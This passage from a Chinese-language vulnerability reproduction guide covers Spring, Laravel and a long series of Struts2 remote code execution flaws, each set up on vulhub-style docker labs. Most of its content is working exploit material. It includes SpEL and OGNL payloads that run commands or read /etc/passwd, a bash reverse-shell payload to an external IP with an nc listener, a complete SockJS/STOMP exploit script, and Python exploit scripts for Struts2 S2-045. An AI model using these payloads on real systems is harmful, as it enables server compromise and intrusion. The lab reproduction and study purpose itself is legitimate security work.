Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码
```

#### 影响版本

```php
Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3
Spring Boot version < 2.0.0M4
Spring Data release trains < Kay-RC3
```

#### 环境搭建

```php
docker pull vulhub/spring-rest-data:2.6.6
docker run -d -p 8082:8080 vulhub/spring-rest-data:2.6.6
```

#### 漏洞复现

（1）访问`http://your-ip:8082/`即可看到json格式的返回值，说明这是一个Restful风格的API服务器。

![image-20220122204511942](image/image-20220122204511942.png)

（2）访问`http://your-ip:8082/customers/1`，看到一个资源。我们使用PATCH请求来修改：

```
[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]
```

![image-20220122204900358](image/image-20220122204900358.png)

path的值是SpEL表达式，发送上述数据包，将执行`new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}`表示的命令`touch /tmp/success`，进入容器上查看是否新建成功了

这是将每个字符转为对应的十进制，可以通过下面的python代码进行转换：

```php
payload = b'touch /tmp/success'
bytecode = ','.join(str(i) for i in list(payload))
print(bytecode)
```

![image-20220122205000187](image/image-20220122205000187.png)

（3）反弹Shell

命令：`bash -i >& /dev/tcp/192.168.48.1/8888 0>&1`

[base64编码](https://ares-x.com/tools/runtime-exec/)：`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ4LjEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}`

进制转换：

```python
98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,81,52,76,106,69,118,79,68,103,52,79,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125
```

在本地主机上运行nc监听8888端口

```bash
nc -lvp 8888
```

构造Payload反弹Shell发送

```php
[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,81,52,76,106,69,118,79,68,103,52,79,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname", "value": "vulhub" }]
```

成功反弹Shell

![image-20220122210345165](image/image-20220122210345165.png)



------

### Spring Messaging 远程命令执行漏洞（CVE-2018-1270）

#### 漏洞简述

```php
　spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用`StandardEvaluationContext`解析，造成命令执行漏洞。
```

#### 影响版本

```php
Spring Framework 5.0 to 5.0.4
Spring Framework 4.3 to 4.3.14
```

#### 环境搭建

```php
docker pull vulhub/spring-messaging:5.0.4
docker run -d -p 8083:8080 vulhub/spring-messaging:5.0.4
```

#### 漏洞复现

（1）访问：http://your-ip:8083

![image-20220122210708403](image/image-20220122210708403.png)

（2）使用exploit脚本进行漏洞利用

exploit：

```python
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))


class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)

    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
    
    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']

        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
        
        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])

        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")

    def __del__(self):
        self.session.close()


sockjs = SockJS('http://192.168.22.1:8083/gs-guide-websocket')
sockjs.start()
time.sleep(1)

sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",
    'id': 'sub-0',
    'destination': '/topic/greetings'
})

data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)
```

（3）运行exploit.py脚本·

```python
python3 exploit.py
```

![image-20220122210955707](image/image-20220122210955707.png)

（4）进入容器上查看是否已经新建成功

![image-20220122211152833](image/image-20220122211152833.png)





------

### Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）

#### 漏洞简述

```php
  Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。
```

#### 影响版本

```php
Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)
Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)
Spring Data Commons 2.0 to 2.0.5 (Kay SR5)
Spring Data REST 3.0 - 3.0.5 (Kay SR5)
```

#### 环境搭建

```php
docker pull vulhub/spring-data-commons:2.0.5
docker run -d -p 8084:8080 vulhub/spring-data-commons:2.0.5
```

#### 漏洞复现

（1）访问`http://your-ip:8084/users`，将可以看到一个用户注册页面。

![image-20220122211433107](image/image-20220122211433107.png)

（2）参考网上的Payload，在注册的时候抓包，并修改成如下数据包：

```python
POST /users?page=&size=5 HTTP/1.1
Host: 192.168.22.1:8084
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=8e0a64268c3ddd7456c6bc9ece93a7f5; beegosessionID=462125924096e6da9d5b569c4f05343f; JSESSIONID=F36EE6B6E4795EBCB2284EE188DF2759
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch+/tmp/success")]=&password=&repeatedPassword=
```

![image-20220122211757006](image/image-20220122211757006.png)

（3）进入容器上查看/tmp/seccuss文件是否已经新建成功

![image-20220122211901110](image/image-20220122211901110.png)





## Laravel漏洞复现

### Laravel 远程代码执行漏洞(CVE-2021-3129)

#### 漏洞简述

```php
 Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。 Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。
```

#### 影响版本

- Laravel 框架 < 8.4.3
- facade ignition 组件 < 2.5.2

####  环境搭建

目前 Vulfocus 已经集成 Laravel 环境，可通过以下命令进行拉取运行：

```php
docker pull vulfocus/laravel-cve_2021_3129:latest
docker run -d -P vulfocus/laravel-cve_2021_3129
```

也可使用线上环境 http://vulfocus.fofa.so/ 进行测试

#### 漏洞复现

（1）访问`http://your-ip/即可查看到默认页面

![image-20220122163116605](image/image-20220122163116605.png)

（2）下载exp攻击写入Webshell

下载地址：https://github.com/0day666/EXP_POC/blob/main/Laravel/Laravel_RCE_CVE2021-3129_EXP.py

```php
python3 exp.py http://your-ip/
```

![image-20220115045704220](image/image-20220115045704220.png)

2、用中国蚁剑连接Webshell

![image-20220115045720400](image/image-20220115045720400.png)



------

#### 漏洞修复

1. 临时修复方案：若业务环境允许，使用白名单限制相关web项目的访问来降低风险。
2. 通用修复建议：建议将 Laravel 框架升级至8.4.3及其以上版本，或者将 facade ignition组件升级至 2.5.2 及其以上版本。



## Sturts2漏洞复现

### Struts2-001远程代码执行漏洞(CVE-2007-4556)

#### 漏洞简述

```php
 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
```

#### 影响版本

```php
Struts 2.0.0 - Struts 2.0.8
```

#### 漏洞复现

##### 漏洞利用代码

**burpsuite抓包，发送exp执行命令（带参数的命令：）new java.lang.String[]{"cat","/etc/passwd"}：**

```
%25%7b%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5b%5d%7b%22pwd%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew%20java.io.InputStreamReader(%23b)%2c%23d%3dnew%20java.io.BufferedReader(%23c)%2c%23e%3dnew%20char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new%20java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d%20
```

![image-20220122171512370](image/image-20220122171512370.png)

#### 漏洞建议

目前厂商已发布漏洞解决方法： https://cwiki.apache.org/confluence/display/WW/S2-001



------

### Struts2-005远程代码执行漏洞(CVE-2010-1870)

#### 漏洞简介

```php
Struts2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开
```

#### 影响版本

```
Apache Struts 2.0.0 - 2.1.8.1
```

#### 漏洞复现

##### 漏洞利用代码(无回显)

```
/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
```

##### 漏洞利用代码(有回显)

```
/example/HelloWorld.action?(%27%5c43_memberAccess.allowStaticMethodAccess%27)(a)=true&(b)((%27%5c43context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5c75false%27)(b))&(%27%5c43c%27)((%27%5c43_memberAccess.excludeProperties%5c75@java.util.Collections@EMPTY_SET%27)(c))&(g)((%27%5c43mycmd%5c75%5c%27whoami%5c%27%27)(d))&(h)((%27%5c43myret%5c75@java.lang.Runtime@getRuntime().exec(%5c43mycmd)%27)(d))&(i)((%27%5c43mydat%5c75new%5c40java.io.DataInputStream(%5c43myret.getInputStream())%27)(d))&(j)((%27%5c43myres%5c75new%5c40byte[51020]%27)(d))&(k)((%27%5c43mydat.readFully(%5c43myres)%27)(d))&(l)((%27%5c43mystr%5c75new%5c40java.lang.String(%5c43myres)%27)(d))&(m)((%27%5c43myout%5c75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&(n)((%27%5c43myout.getWriter().println(%5c43mystr)%27)(d))
```

![image-20220122171644885](image/image-20220122171644885.png)

#### 漏洞修复

目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接： http://struts.apache.org/2.2.1/docs/s2-005.html



------

### Struts2-007远程代码执行漏洞(CVE-2012-0838)

#### 漏洞简介

当来自于用户传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞 当 -validation.xml配置的验证规则。如果类型验证转换失败，服务器将拼接用户提交的表单值字符串，然后执行OGNL表达式解析并返回。 例如这里是一个UserAction：

```
(...)
public class UserAction extends ActionSupport {
    private Integer age;
    private String name;
    private String email;

(...)
```

和UserAction-validation.xml配置：

```php
<?xml version="1.0" encoding="UTF-8" ?> <!DOCTYPE validators PUBLIC     "-//OpenSymphony Group//XWork Validator 1.0//EN"     "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"> <validators>     <field name="age">         <field-validator type="int">             <param name="min">1</param>             <param name="max">150</param>         </field-validator>     </field> </validators>
```

当用户提交age为 astr而不是 an 时int，服务器"'" + value + "'"与代码进行拼接，然后使用 OGNL 表达式对其进行解析。为了使exploot成功，我们需要找到一个配置了类似验证规则的表单字段来进行转换错误。然后你可以像注入SQL单引号一样注入任何OGNL表达式代码。

#### 影响版本

```php
Apache Struts2 2.0.0 - 2.2.3
```

#### 漏洞复现

##### 漏洞利用代码

这是可以执行任意代码的 EXP：

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

将EXP放入输入框（age），然后得到命令执行结果：

![image-20220122171819620](image/image-20220122171819620.png)

![image-20220122171828818](image/image-20220122171828818.png)

#### 漏洞修复

**建议升级Struts2到最新版本**



------

### Struts2-008远程代码执行漏洞(CVE-2012-0392)

#### 漏洞简介

```php
2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。
```

#### 影响版本

```php
Apache Struts 2.0.0 - Struts2 2.3.17
```

#### 漏洞复现

![image-20220122172014337](image/image-20220122172014337.png)

##### 漏洞利用代码

在?debug=command&expression=在devModemode中加入参数，OGNL表达式会直接执行，可以执行命令：

```php
http://192.168.0.1:10120/devmode.action?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%29
```

![image-20220122172033449](image/image-20220122172033449.png)

#### 漏洞修复

**建议升级Struts2到最新版本**



------

### Struts2-009远程代码执行漏洞(CVE-2011-3923)

#### 漏洞简介

```php
2.3.1.2 之前的 Apache Struts 允许远程攻击者绕过 ParameterInterceptor 类中的安全保护并执行任意命令。 此漏洞源自 s2-003、s2-005。如果想了解漏洞原理，需要阅读s2-005的说明
```

#### 影响版本

```php
Apache Struts 2.1.0 - 2.3.1.1
```

#### 漏洞复现

##### 漏洞利用代码

```
http://192.168.0.1:50351/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
```

![image-20220122172434206](image/image-20220122172434206.png)

#### 漏洞修复

目前厂商已发布升级补丁以修复漏洞，补丁获取链接： http://struts.apache.org/download.cgi#struts2312



------

### Struts2-012远程代码执行漏洞(CVE-2013-1965)

#### 漏洞简介

配置如果使用重定向类型时result在action，和$ {PARAM_NAME}也被用作重定向变量，例如：

```
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
```

在重定向过程中，struts2对name参数的值进行OGNL表达式解析，从而插入OGNL表达式导致命令执行。

#### 影响版本

```php
Apache Struts 2.1.0 - Apache Struts 2.3.13
```

#### 漏洞复现

##### 漏洞利用代码

```php
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

![image-20220122172611885](image/image-20220122172611885.png)

![image-20220122172623165](image/image-20220122172623165.png)

#### 漏洞修复

**建议升级到最新版本**

------

### Struts2-013/14远程代码执行漏洞(CVE-2013-1966/CVE-2013-2115)

#### 漏洞简介

```php
Struts2 的标签<s:a>和<s:url>，提供了一个includeParams 属性。该属性的主要作用是了解是否包含http 请求参数。 includeParams 的允许值为：

1. none - 在 URL 中不包含参数（默认）
2. get - 在 URL 中仅包含 GET 参数
3. all - 在 URL 中包含 GET 和 POST 参数

当 时includeParams=all，此请求的 GET 和 POST 参数放在 URL 的 GET 参数上。在此过程中，参数将被 OGNL 表达式解析。它导致命令执行。
```

#### 影响版本

```php
Apache Struts 2.0.0 - Apache Struts 2.3.14.1
```

#### 漏洞复现

##### 漏洞利用代码

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}

// 或

${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
```

![image-20220122172758828](image/image-20220122172758828.png)

S2-014 是对 S2-013 的修正。因为当S2-013固定时，${ognl_exp}等OGNL表达式的执行方法被忽略了，S2-014是针对它的增强补丁。

```
http://192.168.0.1:8050/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D
```

#### 漏洞修复

**建议升级到最新版本**



------

### Struts2-015远程代码执行漏洞(CVE-2013-2135, CVE-2013-2134)

#### 漏洞简介

**Struts 2 允许基于通配符定义动作映射，如下例所示：**

```
<package name="S2-015" extends="struts-default">
    <action name="*" class="com.demo.action.PageAction">
        <result>/{1}.jsp</result>
    </action>
</package>
```

**如果一个请求与任何其他定义的动作不匹配，它将被 \* 匹配，并且请求的动作名称将用于根据动作名称加载 JSP 文件。由于 {1} 的值作为 OGNL 表达式受到威胁，因此允许在服务器端执行任意 Java 代码。这个漏洞是两个问题的组合：**

1. **请求的操作名称未转义或再次检查白名单**
2. **当用$和%开放字符的组合时，对TextParseUtil.translateVariables 中的OGNL表达式进行双重评估**

#### 影响版本

```php
Apache Struts 2.0.0 - Apache Struts 2.3.14.2
```

#### 漏洞复现

##### 漏洞利用代码

```
http://192.168.0.1:8100/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}
```

需要用url进行编码

```
http://192.168.0.1:8100/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23q%7D.action
```

![image-20220122172856257](image/image-20220122172856257.png)

#### 漏洞修复

建议升级到最新版本

------



### Struts2-016远程代码执行漏洞(CVE-2013-2251)

#### 漏洞简介

```php
Struts2 是第二代基于Model-View-Controller (MVC)模型的java企业级web应用框架。它是WebWork和Struts社区合并后的产物。Apache Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts 2.3.15.1以下版本均存在此漏洞。
```

#### 影响版本

```php
Apache Struts 2.0.0 - Apache Struts 2.3.15
```

#### 漏洞复现

##### 漏洞利用代码

**执行uname -a命令**

```
/index.action?redirect%3a%24%7b%23req%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletReq'%2b'uest')%2c%23resp%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletRes'%2b'ponse')%2c%23resp.setCharacterEncoding('UTF-8')%2c%23ot%3d%23resp.getWriter%20()%2c%23ot.print('web')%2c%23ot.print('path%3a')%2c%23ot.print(%23req.getSession().getServletContext().getRealPath('%2f'))%2c%23ot.flush()%2c%23ot.close()%7d%20
```

![image-20220122173004802](image/image-20220122173004802.png)

**获取网页目录：**

```
/index.action?redirect%3a%24%7b%23req%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletReq'%2b'uest')%2c%23resp%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletRes'%2b'ponse')%2c%23resp.setCharacterEncoding('UTF-8')%2c%23ot%3d%23resp.getWriter%20()%2c%23ot.print('web')%2c%23ot.print('path%3a')%2c%23ot.print(%23req.getSession().getServletContext().getRealPath('%2f'))%2c%23ot.flush()%2c%23ot.close()%7d%20
```

![image-20220122173028594](image/image-20220122173028594.png)

#### 漏洞修复

**建议升级到最新版本**

------



### Sturts2-032远程代码执行漏洞(CVE-2016-3081)

#### 漏洞简介

```php
Apache Struts 2中存在命令注入漏洞。当程序启用Dynamic Method Invocation时，远程攻击者可借助method：前缀利用该漏洞在服务器端执行任意代码。
```

#### 影响版本

```php
Apache Struts 2.3.20 - Apache Struts 2.3.28（2.3.20.3 和 2.3.24.3 除外）
```

#### 漏洞复现

##### 漏洞利用代码

```
http://192.168.0.1:11867/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id
```

![image-20220122173123202](image/image-20220122173123202.png)

#### 漏洞修复

目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接： https://struts.apache.org/docs/s2-032.html

------



### Struts2-044远程代码执行漏洞(CVE-2017-5638)

#### 漏洞简介

```php
  Apache Struts是美国阿帕奇（Apache）软件基金会的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品，Struts 1和Struts 2。 Apache Struts 2 2.3.32之前的2 2.3.x版本和2.5.10.1之前的2.5.x版本中的Jakarta Multipart解析器存在安全漏洞，该漏洞源于程序没有正确处理文件上传。远程攻击者可借助带有＃cmd=字符串的特制Content-Type HTTP头利用该漏洞执行任意命令。
```

#### 影响版本

```php
受影响的版本：Struts 2.3.5 - Struts 2.3.31、Struts 2.5 - Struts 2.5.10
```

#### 漏洞复现

##### 利用代码

**发起http请求时，将数据包http头部Content-Type改成下面代码发送即可**

```
Content-Type：%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='要执行的命令').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

![image-20220122173202188](image/image-20220122173202188.png)

##### Python漏洞验证脚本

```python
import requests
import sys
import random

def poc(url):
    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
    payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
    headers = {'Content-Type': str(payload)}
    resp = requests.get(url, headers=headers, verify=False, allow_redirects=False)
    if ((random_string in resp.headers.keys()) and (resp.headers[random_string] == random_string)):
        return(True)
    return(False)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage：%s <target>" % (sys.argv[0]))
        sys.exit()
    elif poc(sys.argv[1]):
        print("Vulnerable")
    else:
        print("not vulnerable")
```

![image-20220122173213388](image/image-20220122173213388.png)

##### Python漏洞利用脚本

```python
import requests
import sys

def exploit(url,cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
    header = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
              "Content-Type":payload}
    timeout = 3
    try:
        response = requests.get(url,headers=header,verify=False,timeout=3,allow_redirects=False)
    except requests.exceptions.ChunkedEncodingError:
        try:
            response = b""
            with requests.get(url=url, headers=header, verify=False, timeout=timeout, stream=True) as resp:
                for i in resp.iter_content():
                    response += i
        except requests.exceptions.ChunkedEncodingError as e:
            print("EXCEPTION::::--> " + str(e))
            print("Note: Server Connection Closed Prematurely\n")
        except Exception as e:
            print("EXCEPTION::::--> " + str(e))
            response = 'ERROR'
        if type(response) != str:
            response = response.decode('utf-8')
        return (response)
    except Exception as e:
        print("EXCEPTION::::--> " + str(e))
        output = 'ERROR'
    return (response)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("python3 struts2-045.py url cmd")
        sys.exit()
    else:
        url = sys.argv[1]
        cmd = sys.argv[2]
        res = exploit(url,cmd)
        print(res)
```

![image-20220122173242642](image/image-20220122173242642.png)

#### 漏洞修复

目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接： https://cwiki.apache.org/confluence/display/WW/S2-045

------



### Struts2-046远程代码执行漏洞（CVE-2017-5638）

#### 漏洞简介

```php
